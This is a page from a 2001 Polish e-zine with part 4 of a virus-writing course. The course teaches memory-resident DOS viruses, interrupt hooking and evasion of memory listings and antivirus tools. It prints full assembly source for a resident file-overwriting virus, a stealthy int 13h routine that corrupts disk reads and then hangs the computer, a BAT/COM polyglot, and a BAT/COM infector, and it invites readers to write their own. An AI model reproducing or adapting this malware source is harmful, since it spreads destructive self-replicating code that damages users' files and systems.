<html><head><meta http-equiv=Content-Type content="text/html; charset=iso-8859-2"><link rel=stylesheet href="magazin.css" TYPE="text/css"><title>MagaZin #4 :: wrzesieñ 2001</title></head><body link=478DE7 vlink=478DE7 alink=478DE7 topmargin=0 bottommargin=0 bgcolor="#000000"><div align=center><center><table border=0 width=700 cellspacing=0 cellpadding=0 height=250 bgcolor="#FFFFFF"><tr><td width=697 height=154 valign=top><img border=0 src="../img/up.png" width=700 height=150></td></tr><tr><td width=697 height=1 valign=top><div align=center><center><table border=0 width="92%" cellspacing=0 cellpadding=4><tr><td width="10%"><a href="15.htm"><img border=0 src="../img/4.gif" width=50 height=25 align=right></a></td><td width="23%"><font face=Arial size=1>poprzednia</font></td><td width="33%"><p align=center><a href="spis.htm"><img border=0 src="../img/6.gif" width=200 height=20></a></td></center></center><td width="23%"><p align=right><font size=1 face=Arial>nastêpna</font></td><td width="10%"><a href="17.htm"><img border=0 src="../img/3.gif" width=50 height=25></a></td></tr></table></div></td></tr><center><tr><td width=697 height=83 valign=top><div align=center><center><table border=0 width="92%" height=1 cellspacing=10 cellpadding=2><tr><td width="100%" height=5 valign=top colspan=2></td></tr><tr><td width="100%" height=16 valign=top bgcolor="#000000" colspan=2><img border=0 src="../img/13a.gif" width=225 height=14></td></tr><tr><td width="100%" height=1 valign=top colspan=2><font face=Arial size=2><br></font><div align=center><center><table border=0 width="100%" cellspacing=0 cellpadding=0><tr><td width="64%" valign=top height=30><font class=u>Kurs pisania wirusów, cz. 4</font></td></center></center></center><td width="36%" valign=top height=30><p align=right></td></tr></table></div><center><center></center></center></td></tr><tr><td width="50%" height=1 valign=top rowspan=3><p align=justify><font class=9pt>Witam w kolejnej czê¶ci kursu po¶wiêconemu WIRUSOM. My¶lê, ¿e po poprzednich lekcjach czego¶ siê nauczy³e¶. Je¶li nie, to najpierw przestudiuj jej jeszcze raz, bo inaczej bêdziesz mia³ zaleg³o¶ci. Przypominam, ¿e jest to ju¿ czwarta czê¶æ z tego cyklu. Je¶li nie masz poprzedniej, a chcia³by¶ mieæ, to zajrzyj na moja stronê WWW HTTP://BINBOY.KOTI.COM.PL lub napisz do mnie: BINBOY@ULGO.KOTI.COM.PL<br><br><b>0. Zaczynamy</b><br><br>Jaki jest cel tego tekstu nie trzeba chyba pisaæ. Je¶li jeste¶ z³y na ca³y ¶wiat, to dobrze trafi³e¶. W tej czê¶ci kursu zajmiemy siê wirusami rezydentnymi. Poznamy ich ogóln± budowê i sposób dzia³ania. Stworzymy tak¿e bardzo ciekaw± procedurê destrukcyjn±. W tej czê¶ci kursu poznamy tak¿e ogóln± budowê i funkcjonowanie wirusów plików BAT. Takich wirusów jest stosunkowo ma³o, wiêc mo¿e napiszesz jaki¶?? ;-) Dobra. Skoñczmy to lanie wody i zwiêkszanie objêto¶ci tego pliku i tak zajmuje 28471 bajtów. Przejd¼my do rzeczy.<br><br><b>1. Wstêp do pisania wirusów rezydentnych</b><br><br>W poprzednich czê¶ciach zawarty by³ kurs pisania wirusów, które mia³y te szczególn± w³asno¶æ, ¿e próbê infekcji podejmowa³y tylko w momencie uruchamiania nosiciela. Jest to dla wirusów du¿e ograniczenie. W przypadku wirusa, który aby znale¼æ ofiarê przeszukuje tylko aktualny katalog ta niedogodno¶æ jest oczywista - w koñcu ile¿ plików do zara¿enia mo¿e byæ w jednym katalogu ? :-) Z kolei wirus przeszukuj±cy ca³y dysk, po kilku uruchomieniach, kiedy wszystkie pliki "bli¿ej" niego bêd± ju¿ zara¿one, bêdzie w poszukiwaniu ofiar rzêzi³ po tym dysku i rzêzi³, wyd³u¿aj±c przy tym czas uruchamiania nosiciela..... jednym s³owem zdemaskuje siê w ten sposób i klapa. Rozwi±zaniem tych problemów s± wirusy rezydentne. Zak³adam, ¿e ten, kto to czyta wie, co to s± programy rezydentne, przerwania, tablica wektorów przerwañ itd. Wirus rezydentny instaluje siê w pamiêci przy uruchomieniu nosiciela, siedzi sobie tam cichcem, a¿ wyczai np., ¿e DOS uruchamia jaki¶ plik no i wtedy go cap.<br><br><b>2. Instalowanie siê w pamiêci</b><br><br>Wirus mo¿e instalowaæ siê w przeró¿nych miejscach pamiêci operacyjnej (oczywi¶cie nie s± one ca³kiem dowolne, ale skoro wiesz, co to s± programy rezydentne, jest to dla ciebie oczywiste... ;-). Wybór miejsca jest sprawa bardzo istotna, gdy¿ wp³ywa on na mo¿liwo¶æ zdemaskowania wirusa. W ogólno¶ci pewne jest, ¿e wirus nie powinien do instalacji rezydentnej u¿ywaæ przeznaczonych do tego funkcji DOS-a (tj. int 27h, funkcja 31h int 21h). Takiego wirusa jest w stanie wykryæ ka¿dy program pokazuj±cy zawarto¶æ pamiêci (np. MEM z DOS-a). Dlatego tez twórcy wirusów kombinowali, kombinowali i w koñcu wykombinowali. Pierwsze miejsce w pamiêci, gdzie wirus mo¿e siê skopiowaæ to druga polowa tablicy wektorów przerwañ (adres 0:200h). Do dyspozycji wirusa jest tam 512 bajtów, co niestety nie zawsze wystarcza. Tej metody jednak nie polecam - druga czê¶æ TWP nie jest niby u¿ywana, ale niektóre programy mog± u¿ywaæ przerwañ o wysokich numerach, co w po³±czeniu z wirusem spowoduje zawieszenie komputera. Zaleta tego rozwi±zania jest jednak fakt, ze wirus nie zmniejsza ilo¶ci pamiêci dostêpnej dla innych programów. Drugie miejsce (lepsze od poprzedniego) to obszar danych DOS-u. Zaczyna siê on pod adresem 0:500h. W³a¶ciwie nie bardzo wiem, do czego ma on s³u¿yæ, grunt, zamazywanie go nigdy nie spowodowa³o u mnie ¿adnych niepo¿±danych skutków (typu zawieszenie komputera, czy cos). Do dyspozycji wirusa jest niby 512 bajtów, ale pierwsze powiedzmy 64, lepiej zostawiæ w spokoju (zawsze tak robi³em) i instalowaæ wirusa od 0:540h, co oczywi¶cie powoduje, ¿e musi on byæ krótszy. Kolejn± technik± (chyba najczê¶ciej u¿ywan± przez wirusy) to zmniejszenie bloku pamiêci przydzielonego przez DOS nosicielowi o d³ugo¶æ wirusa, przydzielenie wirusowi powsta³ego w ten sposób wolnego bloku pamiêci i (koniecznie!) modyfikacja jego nag³ówka, gdy¿ inaczej wirusa bêdzie prawie tak samo ³atwo zdemaskowaæ, jakby instalowa³ siê u¿ywaj±c do tego celu funkcji DOS-u. Zmiana d³ugo¶ci bloku pamiêci nosiciela oraz przydzia³ pamiêci wirusowi mo¿e byæ wykonywany przy pomocy przeznaczonych do tego funkcji DOS-u lub przez "rêczn±" modyfikacje nag³ówków bloków pamiêci (zalecane!). Ostatni± technik±, o której tutaj wspomnê (co nie znaczy, ¿e wiêcej nie ma) to instalowanie siê w HMA, czyli bloku pamiêci tu¿ ponad granica 1MB, który dostêpny jest w wersjach systemu DOS 5.00+. Do instalacji w HMA s³u¿± specjalne funkcje przerwania 2Fh (rêcznie tez mo¿na, a nawet lepiej, ale nigdy tego nie robi³em...:-(). Te funkcje to:<br><br><b>FUNKCJE PRZERWANIA 2Fh DO PRZYDZIA£U PAMIÊCI W HMA:</b><br><br><b>Funkcja 4A01h: </b>Funkcja pyta o wolne miejsce w HMA<br> Opis: Pozwala programowi okre¶liæ, ile miejsca pozostaje w HMA po za³adowaniu tam DOS-a.<br> Parametry: AX = 4A01h<br> Wynik: BX = Liczba wolnych bajtów w HMA (je¶li DOS nie za³adowany do HMA to 0)<br> ES:DI = Adres pierwszego wolnego bajtu w HMA (lub FFFF:FFFF, je¶li DOS nie w HMA)<br><br><b>Funkcja 4A02h: </b>Przydzia³ pamiêci w HMA<br> Opis: Przydziela wolna pamiêæ w HMA<br> Parametry: AX = 4A02h<br> BX = Liczba bajtów przydzielanej pamiêci<br> Wynik: ES:DI = Adres pierwszego bajtu przydzielonej pamiêci (FFFF:FFFF, je¶li DOS nie w HMA)<br><br><b>3. Przejmowanie przerwañ</b><br><br>¯eby wirus by³ informowany o fakcie uruchamiania programu, czy te¿ otwierania/zamykania pliku przez DOS musi przej±æ odpowiednie przerwanie. Wirusy przejmuj± ró¿ne przerwania zale¿nie od tego, co maja robiæ, czy pokazuj± jakie¶ efekty, odgrywaj± melodyjki czy co. Co do jednego przerwania wszystkie wirusy plikowe s± zgodne - int 21h po prostu trzeba przej±æ. Po jego przejêciu, przy ka¿dym jego wywo³aniu najpierw zg³osi siê wirus, a po zrobieniu swojej roboty - wywo³a oryginalny program obs³ugi przerwania. Sposobów przejmowania przerwañ jest mnóstwo. Najprostszy to wykorzystanie przeznaczonych do tego celu funkcji DOS-u tj. 35h i 25h, jak zwykle - nie zalecany, bo naj³atwiejszy do wykrycia.<br><br><b>FUNKCJE PRZERWANIA 21h ZWI¡ZANE Z&nbsp;</b><br><b>WEKTORAMI PRZERWAÑ:</b><br><br><b>Funkcja 35h: </b>Odczytanie wektora przerwania.<br> Parametry: AH = 35h&nbsp;<br> AL = numer przerwania<br> Wynik: ES:BX = Adres procedury obs³ugi przerwania<br><br><b>Funkcja 25h:</b> Zapisanie wektora przerwania.<br> Parametry: AH = 45h&nbsp;<br> AL = numer przerwania<br> DS:DX = Adres nowej procedury obs³ugi<br><br>Znacznie lepsze (i prawie równie proste) jest bezpo¶rednie manipulowanie na tablicy wektorów przerwañ. Z kolei zaawansowane wirusy szukaj± (ro¿nymi sposobami) tzw. "czystych" wej¶æ do systemu (tak, ¿eby omin±æ rezyduj±ce programy antywirusowe), ale tym nie bêdziemy siê na razie zajmowaæ.<br><br><b>4. Obs³uga przejêtego przerwania</b><br><br>Sprawa jest prosta, ¿eby nie powiedzieæ, ¿e oczywista. Procedura obs³ugi przerwania zawarta w wirusie musi:<br><br>- sprawdziæ, czy wywo³ywana jest funkcja, która interesuje wirusa np. otwieranie pliku i je¶li tak - odpowiednio zadzia³aæ<br> - wywo³aæ oryginalna procedurê obs³ugi przejêtego przerwania - na to jest kilka sposobów:<br> 1) jmp XXXX:YYYY ; gdzie XXXX:YYYY adres oryginalnej procedury<br> 2) pushf ; tak trzeba, dla symulacji przerwania<br> call XXXX:YYYY<br> 3) pushf ; tak znowu trzeba<br> call far cs:[adres_procedury_obslugi]<br> Najlepszy jest pierwszy sposób, ale czasem nie da siê go zastosowaæ i wtedy trzeba drugi (drugi i trzeci robi± dok³adnie to samo, a drugi jest lepszy, bo jest krótszy i... lepszy :-)<br><br><b>5. Najprostszy wirus rezydentny</b><br><br>Teraz zajmiemy siê najprostszym i do tego jednym z krótszych wirusów rezydentnych. Jako ¿e jest on PROSTY i KRÓTKI jest tak¿e bardzo prymitywny i do tego do instalacji w pamiêci u¿ywa funkcji DOS-u (to te, przy których pisze, ¿e nie zalecane ;-))). Wirus nie sprawdza, czy jest ju¿ zainstalowany, nie sprawdza te¿, czy infekowany plik nie jest ju¿ przypadkiem "chory", nie zachowuje czasu i daty ostatniej modyfikacji ofiary, a atrybut ReadOnly jest dla niego przeszkod± nie do pokonania - jednym s³owem... ki³a, ale to nic. Aha, i do tego zapisuje siê na pocz±tku pliku, czyli go niszczy.... No, wiêc plan jest taki - kto¶ odpala wirusa, a on:<br><br>- odczytuje wektor przerwania 21h i zapamiêtuje go (funkcja DOS-u 35h)<br> - zmienia wektor przerwania tak, aby wskazywa³ na odpowiednia procedurê<br> wirusa (funkcja DOS-a 25h)<br> - oddaje sterowanie DOS-owi, ale pozostaje w pamiêci (int 27h)<br><br><br><font color="#478DE7">;---tu siê zaczyna wirus--------------------------------------------<br><br>.286 ;\<br> .model tiny ; dyrektywy asemblera - tak po<br> .code ; prostu ma byæ :-)<br> org 100h ;/<br><br>dlugosc_wirusa equ (offset koniec_wirusa - offset _start)<br><br>_start:<br> mov ax,3521h ; odczytanie wektora<br> int 21h ; przerwania 21h...<br> mov word ptr [wektor_21h],bx ; ..i jego zapamiêtanie<br> mov word ptr [wektor_21h+2],es ; w przeznaczonej na to<br> mov ah,25h ; zmiennej<br> mov dx,(offset obsluga_21h) ; zmiana wektora, ¿eby<br> int 21h ; wskazywa³ na wirusa<br> mov dx,(offset koniec_wirusa) ; zakoñczenie procesu<br> int 27h ; z pozostawieniem w<br> ; pamiêci<br><br>;&lt;--- tutaj bêdzie oddawane sterowanie zawsze, gdy jaki¶ program wywo³a przerwanie 21h<br><br>obsluga_21h:<br> cmp ah,3Dh ; czy otwarcie pliku ?<br> je dalej ; je¶li tak to "dalej"<br> db 0EAh ; kod instrukcji JMP XXXX:YYYY<br> wektor_21h dd ? ; te 4 bajty to adres oryginalnej procedury<br> ; obs³ugi przerwania, stanowi± one czê¶æ<br> ; wcze¶niejszej instrukcji (czyli JMP)<br> ; np. je¶li wektor 21h przed instalacj± wirusa wskazywa³ 1234:5678 to teraz<br> ; instrukcja jmp wygl±da tak: JMP 1234:5678<br><br>dalej: pushf ; zachowanie znaczników na stosie dla<br> ; symulacji przerwania<br> ; Tak trzeba, bo procesor przed wykonaniem instrukcji INT robi to samo, wiec<br> ; procedury obs³ugi przerwañ uwa¿aj±, ze znaczniki s± na stosie - je¶li by<br> ; ich nie by³o to by siê spieprzy³o :-)<br><br>mov al,2 ; jak wiadomo z opisu funkcji 3Dh przerwania<br> ; 21h w AL jest tryb otwarcie pliku.<br> ; Mo¿e siê okazaæ, ze jaki¶ program otwiera plik tylko do odczytu, wiec<br> ; wirus nie móg³by siê wtedy do niego dopisaæ, a tak tryb otwarcia bêdzie<br> ; "do odczytu i zapisu".<br><br>call dword ptr cs:[wektor_21h] ; wywo³anie oryginalnej<br> ; procedury obs³ugi<br> ; to jest ten g³upi sposób, ale tak trzeba. Instrukcja ta spowoduje otwarcie<br> ; pliku. Nie mo¿na wywo³aæ DOS-a przez JMP, bo sterownie nie wróci³o by do<br> ; wirusa, a musi siê przecie¿ jeszcze dopisaæ. Nie mo¿na tez wywo³aæ DOS-a<br> ; przez int 21h.<br><br>pusha ; zachowanie zmienianych rejestrów na<br> push ds ; stosie<br> push cs&nbsp;<br> pop ds ; DS=CS<br> xchg bx,ax ; Dos zwróci³ w BX uchwyt pliku<br> mov ah,40h ; 40h - zapis do pliku<br> mov cx,dlugosc_wirusa ; oczywiste<br> mov dx,100h ; zapisane zostan± bajty spod DS:DX<br> int 21h ; czyli CS:100h, czyli wirus :-)<br> pop ds ; odtworzenie rejestrów<br> popa&nbsp;<br> retf 2 ; daleki powrót, ze zdjêciem ze stosu<br> ; znaczników, bo oryginalna<br> ; procedura obs³ugi tego nie zrobi³a (tzn. zrobi³a, ale ¶ci±gnê³a te<br> ; znaczniki, które wirus wsadzi³ na stos)<br><br>info db '(c) 1999 MBR Labs',0<br> koniec_wirusa:<br> end _start<br><br>;---tu siê koñczy wirus----------------------------------------------</font></font><td width="50%" height=1 valign=top><p align=justify><font class=9pt>Mo¿e siê wydawaæ dziwne, ze wirus w procedurze obs³ugi przerwania 21h wywo³uje funkcje DOS-u w³a¶nie przez int 21h. Sprawa jest prosta - poniewa¿ wirus reaguje na funkcje 3Dh - jej w ten sposób wywo³aæ nie mo¿e, ale inne owszem. Wirus bardzo szybko siê rozmna¿a i niszczy ka¿dy plik, jaki napotka, nie wa¿ne czy wykonywalny, czy nie, wiec lepiej nie uruchamiaæ go, zw³aszcza, na w³asnym komputerze.<br><br><b>6. Rezydentna procedura destrukcji</b><br><br>W trzeciej czê¶ci kursu napisali¶my prost± procedurê destrukcyjn±, która zamazywa³a tablice partycji pierwszego dysku twardego. Uruchomienie takiej procedury przez wirusa jest jednoznaczne z jego ujawnieniem siê, a tego by¶my nie chcieli. Dlatego procedura destrukcji powinna byæ znacznie bardziej finezyjna i dyskretna. Napiszemy procedurê, która podwieszona pod przerwanie 13h (jego opis znajduje siê w czê¶ci 3) bêdzie fa³szowaæ powiedzmy, co setny odczyt z dysku zmieniaj±c jeden pocz±tkowy bajt odczytywanego sektora. Procedura bêdzie tak¿e prowadzi³a licznik zafa³szowanych odczytów i gdy jego warto¶æ osi±gnie np. 20 to od tego momentu fa³szowany bêdzie co 95-ty odczyt itd. Gdy dojdzie do tego, ze fa³szowany bêdzie co 10-ty odczyt, a praca na komputerze bêdzie ju¿ praktycznie niemo¿liwa (o ile komputer siê sam wcze¶niej nie zawiesi), to procedura zawiesi komputer. Taki wirus nie niszczy danych bezpo¶rednio na dysku tylko w pamiêci. Dane na dysku mog± jednak zostaæ zafa³szowane w przypadku kopiowania zbiorów - je¶li jaki¶ program bêdzie kopiowaæ plik, a wirus podmieni mu kilka bajtów w odczytywanych danych, to kopia tego pliku bêdzie ju¿ uszkodzona. Oto krótki programik rezydentny, który to demonstruje.<br><br><font color="#478DE7">;----tu-siê-zaczyna---------------------------------------------------<br><br>.model tiny<br> .code<br> org 100h<br><br>_start:<br> mov ax,3513h ; pobranie adresu procedury<br> int 21h ; obs³ugi przerwania 13H<br> mov word ptr [wektor_int_13h],bx ; zapamiêtanie wyniku w&nbsp;<br> mov word ptr [wektor_int_13h+2],es ; zmiennej WERKTOR_INT_13H<br> mov ah,25h ; zmiana adresu przerwania 13H<br> mov dx,(offset obsluga_int_13h) ; na adres naszej procedury<br> int 21h<br> mov dx,(offset koniec) ; zakoñczenie programu<br> int 27h ; z pozostawieniem w pamiêci<br><br>obsluga_int_13h: ; nasza procedura 13H<br> cmp ah,02h ; je¶li próba odczytu sektora<br> je odczyt_sektorow ; to ODCZYT_SEKTOROW<br> wywolaj_int_13h: db 0EAh ; je¶li nie, to wywo³anie<br> wektor_int_13h dd ? ; oryginalnego przerwania<br><br>odczyt_sektorow: ; odczytujemy z dysku<br> inc byte ptr cs:[licznik_odczytow] ; zwiêkszenie licznika<br> ; odczytów<br> push ax&nbsp;<br> mov al,byte ptr cs:[co_ile_psuc] ; do AL, co ile mamy psuæ<br> cmp byte ptr cs:[licznik_odczytow],al. ; je¶li jeszcze nie pora<br> pop ax<br> jne wywolaj_int_13h ; to wywo³ujemy oryginalna<br> ; procedurê obs³ugi 13H<br> mov byte ptr cs:[licznik_odczytow],0 ; je¶li pora, to wyzerowanie<br> ; licznika odczytów<br> cmp byte ptr cs:[licznik_zepsutych],20 ;je¶li jeszcze nie popsuto 20<br> jne zepsuj ; to zepsuj<br> mov byte ptr cs:[licznik_zepsutych],0 ; a je¶li zepsuto, to wyzeruj<br> ; licznik zepsutych<br> cmp byte ptr cs:[co_ile_psuc],10 ; je¶li ma psuæ co 10 sektor<br> je zawies_komputer ; to ju¿ niech zawiesi kompa<br> sub byte ptr cs:[co_ile_psuc],5 ; zwiêksza czêstotliwo¶æ<br> ; psucia odczytów sektorów<br> zepsuj: pushf<br> call dword ptr cs:[wektor_int_13h] ; odczyt sektora<br> mov byte ptr es:[bx],80h ; popsucie pierwszego<br> ; bajtu odczytanego sektora<br> inc byte ptr cs:[licznik_zepsutych] ; zwiêkszenie licznika<br> ; popsutych sektorów<br> iret<br><br>zawies_komputer: retf ; to spowoduje zawieszenie<br> ; systemu<br> licznik_odczytow db 0<br> licznik_zepsutych db 0<br> co_ile_psuc db 100<br><br>koniec: end _start<br><br>;----tu-sie-konczy-----------------------------------------------------</font><br><br><b>7. Wirusy plików typu BAT</b><br><br>Jak wiadomo wirusy mog± zara¿aæ dos³ownie ka¿dy rodzaj pliku, który tylko zawiera jaki¶ kod wykonywalny. Do takich plików nale¿± miedzy innymi pliki typu .BAT. Choæ nie zawieraj± one kodu maszynowego, jednak mog± byæ wykonywane. Kluczem do napisania wirusa plików .BAT jest przedstawiony poni¿ej program BATCOM, który po asemblacji do pliku typu .COM mo¿e byæ uruchamiany zarówno z rozszerzeniem .BAT jak i .COM czy nawet .EXE. Je¶li program zostanie uruchomiony jako COM/EXE wypisze o tym komunikat. Je¶li zostanie uruchomiony jako BAT, równie¿ wypisze komunikat, po czym skopiuje siê do pliku COM i uruchomi. Proste. Program wykorzystuje fakt, ze etykiety w plikach .BAT zaczynaj± siê od znaku ":". Dlatego ca³y BATCOM zaczyna siê od ": ", co jest odpowiednikiem instrukcji cmp ah,[bx+si], która w sumie nie robi nic wa¿nego (to znaczy robi, ale w naszym przypadku nie ma to wp³ywu na dalszy przebieg wykonywania programu).<br><br><font color="#478DE7">;&lt;------- BATCOM.ASM ------------------ (c) 1999 MBR Labs.<br><br>.model tiny<br> .code<br> org 100h<br><br>start: db ': ' ; cmp ah,[bx+si] - nic nieznacz±ca instrukcja,<br> jmp dalej ; ale w ASCII zaczyna siê od ":", jak etykieta<br> db 13,10,'@echo off' ; w BAT-ach<br> db 13,10,'echo Program uruchomiony jak BATCOM.BAT.'<br> db 13,10,'echo Kopiowanie do pliku .COM.....'<br> db 13,10,'copy %0 tmpÿABCD.com >nul'<br> db 13,10,'echo Wykonywanie pliku .COM.....'<br> db 13,10,'tmpÿABCD.com'<br> db 13,10,'echo Kasowanie pliku .COM......'<br> db 13,10,'del tmpÿABCD.com >nul'<br> db 13,10,'goto '<br> db 13,10<br><br>;------------------------------ Tutaj mo¿na wstawiæ kod wirusa<br><br>dalej: mov ah,9<br> mov dx,(offset napis)<br> int 21h<br> ret<br><br>napis db '>>> Program wykonywany jako BATCOM.COM.',13,10,'$'<br><br>;----- Tutaj wirus powinien siê koñczyæ<br><br>db 13,10,': '<br> info db 'BATCOM / (c) 1999 MBR Labs',0<br><br>end start<br><br>;&lt;---- koniec BATCOM.ASM ---- (c) 1999 MBR Labs. ------</font><br><br>To by³ tylko opis budowy takich wirusów. Poni¿ej znajduje siê bardzo prosty wirus, który w³a¶nie u¿ywa tej procedury.<br><br><font color="#478DE7">;&lt;---- VIR.ASM ---- (c) 1999 MBR Labs &amp; BINBOY ----------<br> .model tiny<br> .code<br> org 100h<br><br>start: db ": " ; razem z nastêpn± instrukcja<br> jmp virus ; tworzy etykietê (nie wa¿ne)<br> db 13,10,"@ECHO OFF" ; wy³±czenie wy¶wietlania<br> db 13,10,"copy %0 ABCD.COM>NUL" ; skopiowanie siê jako COM<br> db 13,10,"ABCD.COM" ; i uruchomienie, teraz VIRUS<br> db 13,10,"del ABCD.COM >NUL" ; skasowanie COM-a<br> db 13,10,"GOTO X" ; skok na koniec<br> db 13,10<br> virus: ; tu zaczyna siê wirus<br> mov ah,4eh ; szukanie pliku<br> xor cx,cx ; o dowolnych atrybutach<br> mov dx,offset maska ; *.BAT<br> szukaj:<br> int 21h<br> jc etyk2 ; je¶li nie znaleziono, to skok<br> call infekcja ; je¶li znaleziono to infekcja<br> mov ah,4fh ; szukanie kolejnego pliku<br> jmp szukaj<br> etyk2:<br> mov ax,4c00h ; zakoñczenie programu<br> int 21h<br> infekcja:<br> mov ax,3d02h ; otwarcie pliku<br> mov dx,09eh ; o nazwie w DTA<br> int 21h<br> xchg bx,ax ; do BX numer doj¶cia<br> mov ah,3fh ; przeczytanie z pliku<br> mov cx,2 ; dwóch bajtów i zapamiêtanie<br> mov dx,offset bufor ; ich w buforze<br> int 21h<br> cmp word ptr bufor,0203Ah ; je¶li te dwa bajty to 0203AH<br> je koniec_inf ; to koniec infekcji<br> xor dx,dx ; DX=0<br> mov cx,dx ; CX=0<br> mov ax,4200h ; ustawienie kursora na<br> ; pocz±tku pliku<br> int 21h<br> mov al,0 ; sprawdzenie daty i czasu<br> mov ah,57h ; ostatniej modyfikacji pliku<br> int 21h<br> push cx ; zapamiêtanie ich na<br> push dx ; stosie<br> mov ah,40h ; zapisanie wirusa w pliku<br> mov cx,offset koniec-100h ; pocz±wszy od 100H, czyli<br> mov dx,100h ; pocz±tku wirusa<br> int 21h<br> mov al,1 ; zmiana na zapamiêtane<br> pop dx ; wcze¶niej na<br> pop cx ; stosie daty i czasu<br> mov ah,57h ; ostatniej modyfikacji<br> int 21h<br> koniec_inf:<br> mov ah,3eh ; zamkniêcie pliku<br> int 21h<br> ret<br> bufor dw 0<br> maska db "*.BAT",0<br> koniec: DB 13,10,":X"<br> END<br> ;&lt;--- koniec VIR.ASM --- (c) 1999 MBR Labs &amp; BINBOY --</font><br><br>Tego wirusa nie trzeba chyba t³umaczyæ, ale dla bardziej u³omnych... ;-) Po skompilowaniu go na COM-a zmieniamy jego nazwê na BAT. Wówczas ten BAT jest w³a¶nie wirusem. Jak dzia³a?... Otó¿ po uruchomieniu jako BAT wirus kopiuje samego siebie do pliku tymczasowego ABCD.COM. Nastêpnie uruchamia go. Po jego zakoñczeniu zostaje on usuniêty i program siê wy³±cza. Je¶li plik zostanie uruchomiony jako COM (ABCD.COM) instrukcja JMP spowoduje skok do w³a¶ciwej procedury zara¿ania pliku. Wówczas zostaje odszukany jaki¶ COM, do którego wirus sam siebie dopisuje. Dopisywany plik nie zmienia swojej objêto¶ci, ani daty i czasu ostatniej modyfikacji. Wirus zabezpieczony jest równie¿ przed zara¿aniem pliku ju¿ zara¿onego. Jest on bardzo prosty. S³u¿y tylko jako przyk³ad. Mo¿na przecie¿ zrobiæ wirusa BAT-ów, który bêdzie rezydentny. Dodaæ jak±¶ procedurê destrukcyjn±, itp. Sposobów jest wiele.<br> No i zakoñczy³a siê kolejna czê¶æ kursu. Nauczyli¶my siê do tej pory zara¿aæ pliki COM i BAT. Pliki COM potrafimy zaraziæ tak, by siê da³y ju¿ naprawiæ, ale i potrafimy zrobiæ tak, by wirus doklei³ siê na koñcu pliku. Nauczyli¶my siê równie¿ jak siê robi proste wirusy rezydentne. Umiemy stworzyæ jak±¶ ciekaw± procedurê destrukcyjna. Potrafimy tak¿e zabezpieczyæ naszego "insekta" przed debuggowaniem i przed disassemblacj±. Postawili¶my wiec du¿y krok.<br></font></tr><tr><td width="50%" height=1 valign=top><hr size=1 color="#478DE7"></tr><tr><td width="50%" height=1 valign=top><p align=justify><font class=9pt>Na tym na razie koñczymy spotkanie z wirusami, które w swoim FAQ zamie¶ci³ Binboy. Je¿eli podoba³ siê Wam nasz kurs to b±d¼cie cierpliwi - byæ mo¿e opublikujemy w przysz³o¶ci kolejne czê¶ci 'sagi' o wirusach. Tych, którzy chc± wypowiedzieæ siê na temat cyklu zapraszam do napisania maila na adres redakcji.<br> Je¿eli chcieliby¶cie zrobiæ swojego w³asnego wirusa a nie macie pod rêk± ¿adnego kompilatora assemblera to mo¿ecie znale¼æ darmowy program A86 w drugim numerze MagaZina lub napiszcie a wtedy zostanie Wam przes³any na skrzynkê pocztow±.<br></font></p><p align=right><font class=9pt><b>Loopus</b></font></tr><tr><td width="100%" height=1 valign=top colspan=2><p align=right><font class=9pt><b>Karol 'Binboy' Wierzcho³owski &amp; MBR</b><br><a href="mailto:binboy@ulgo.koti.com.pl" class=link>binboy@ulgo.koti.com.pl</a>&nbsp; | <a href="http://www.binboy.koti.com.pl" class=link>www.binboy.koti.com.pl</a></font></tr><tr><td width="100%" height=1 valign=middle colspan=2 bgcolor="#000000"><b><font face=Verdana color="#FFFFFF" size=1>&nbsp;Copyright &copy; MagaZin 2001</font></b></td></tr></table><table border=0 width="92%" height=1 cellspacing=10 cellpadding=2><center></table></div></center></td></tr></table></div></body></html>